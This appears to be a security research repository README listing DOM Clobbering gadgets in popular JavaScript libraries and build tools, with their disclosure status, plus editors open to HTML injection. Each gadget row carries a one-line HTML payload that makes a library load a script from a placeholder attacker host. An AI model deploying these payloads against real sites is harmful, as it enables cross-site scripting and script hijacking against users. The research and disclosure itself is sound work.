# DOM Clobbering Collection

This repository lists client-side libraries that are vulnerable to HTML injection or contain DOM Clobbering gadgets that can result in severe issues like XSS.

## DOM Clobbering Gadgets

| Library | Stars | Version | Payloads | Impact | Found By | Status | CVE |
|:-------:|:-----:|:-------:|----------|:------:|:--------:|:------:|:---:|
| [vite](./domc-gadgets/vite.md) | 67.2K | v5.4.5 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
| [Webpack](./domc-gadgets/webpack.md) | 64.4K | v5.93.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
| [astro](./domc-gadgets/astro.md) | 45.7K | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | Reported | N/A |
| [layui](./domc-gadgets/layui.md) | 29.5K | v2.9.16 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
| [rollup](./domc-gadgets/rollup.md) | 25.2K | v4.21.3 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Fixed | 2024-CVE-XXXXX |
| [plausible-analytics](./domc-gadgets/plausible-analytics.md) | 19.7K | v2.1.0 | ```<img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">``` | CSRF | TheHulk | Reported | N/A |
| [plotly.js](./domc-gadgets/plotly.js.md) | 16.9K | v2.35.2 | ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>``` | Open Redirection | TheHulk | N/A | N/A |
| [Prism](./domc-gadgets/prism.md) | 12.2K | v1.29.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>``` | XSS | TheHulk | Reported | N/A |
| [MathJax](./domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Accepted | N/A |
| [MathJax](./domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
| [tsup](./domc-gadgets/tsup.md) | 8.9K | N/A | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Reported | N/A |
| [rspack](./domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | CVE-2024-XXXXX |
| [seajs](./domc-gadgets/seajs.md) | 8.3K | v3.0.3 | ```<img name="scripts" src="https://xxx.xxx.xxx"><img name="scripts" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | N/A | N/A |
| [Google Closure](./domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
| [pagefind](./domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
| [Mavo](./domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [cusdis](./domc-gadgets/cusdis.md) | 2.6K | v1.3.0 | ```<img name="currentScript" data-host="https://xxx.xxx.xxx">``` | XSS | TheHulk | N/A | N/A |
| [Stage.js](./domc-gadgets/stage.js.md) | 2.4K | v1-alpha | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [curl](./domc-gadgets/curl.md) | 1.8K | v0.8.13 | ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx"> ``` | XSS | TheHulk | Reported | N/A |
| [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
| [UMeditor](./domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://xxx.xxx.xxx/"></a>``` | XSS | TheHulk | Reported | N/A |
| [squirt](./domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | N/A |
| [ckplayer](./domc-gadgets/ckplayer.md) | 1.1K | latest | ```<img name="scripts" src="https://xxx.xxx.xxx/js/"><img name="scripts" src="https://xxx.xxx.xxx/js/">``` | XSS | TheHulk | N/A | N/A |
| [polyfills](./domc-gadgets/polyfills.md) | 1.1K | v2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Reported | N/A |
| [doomcaptcha](./domc-gadgets/doomcaptcha.md) | 1K | latest | ```<img name="currentScript" label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | Mitre | N/A |
| [AddToAny](./domc-gadgets/addtoany.md) | N/A | N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | N/A |
| [Google Client API](./domc-gadgets/google-client-api.md) | N/A | 5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>``` | XSS | TheHulk | Patched | N/A |

## HTML Injection Vulnerabilities

The following libraries accept user input and output content as `type/html` with certain named attributes (e.g., `id` or `name`) preserved at different levels of capability. Using these libraries may expose web applications to HTML injection risks. Libraries may directly insert user input into the DOM, or the web application may retrieve the user input from the library and then add it to the DOM.

| Library | Stars | Version | Input | Sanitizer | Capability | Status | CVE |
|:-------:|:-----:|:-------:|-------|:---------:|-------------------------|:------:|:---:|
| [mermaid](./html-injection/mermaid.md) | 70.6K | v0.1.4 | Input | DOMPurify | Any named property without collision | N/A | N/A |
| [tui.editor](./html-injection/tui-editor.md) | 17.1K | v3.2.2 | Type | DOMPurify | Any named property without collision  | N/A | N/A |
| [TinyMCE-v5/6/7](./html-injection/tinymce.md) | 14.9K | v7.3.0 | Copy&Paste | DOMPurify | Any named property without collision | N/A | N/A |
| [TinyMCE-v4](./html-injection/tinymce4.md) | 14.9K | v4.9.11 | Copy&Paste | N/A | Any named property | N/A | N/A |
| [editor.md](./html-injection/editor.md.md) | 13.8K | v1.5.0 | Type | N/A | Any named property | N/A | N/A |
| [simplemde](./html-injection/simplemde.md) | 9.9K | v1.11.2 | Type | N/A | Any named property | N/A | N/A |
| [vditor](./html-injection/vditor.md) | 8.3K | v3.10.6 | Type | N/A | Any named property | N/A | N/A |
| [Froala](./html-injection/froala.md) | 5.3K | v4.2.2 | Copy&Paste | DOMPurify | Any `name` attributes | N/A | N/A |
| [Zenpen](./html-injection/zenpen.md) | 3.8K | latest | Copy&Paste | N/A | Any named attributes | N/A | N/A |
| [editor](./html-injection/editor.md) | 2.8K | v0.1.0 | Type | N/A | Any named property | N/A | N/A |
| [kindeditor](./html-injection/kindeditor.md) | 1.9K | v4.1.12 | Copy&Paste | N/A | Any named property | N/A | N/A |
| [SunEditor](./html-injection/sun-editor.md) | 1.7K | v2.47.0 | Copy&Paste | N/A | `a` tag with `id` | N/A | N/A |
| [RichTextEditor](./html-injection/richtexteditor.md) | N/A | Latest | Copy&Paste | N/A | Any named property | N/A | N/A |
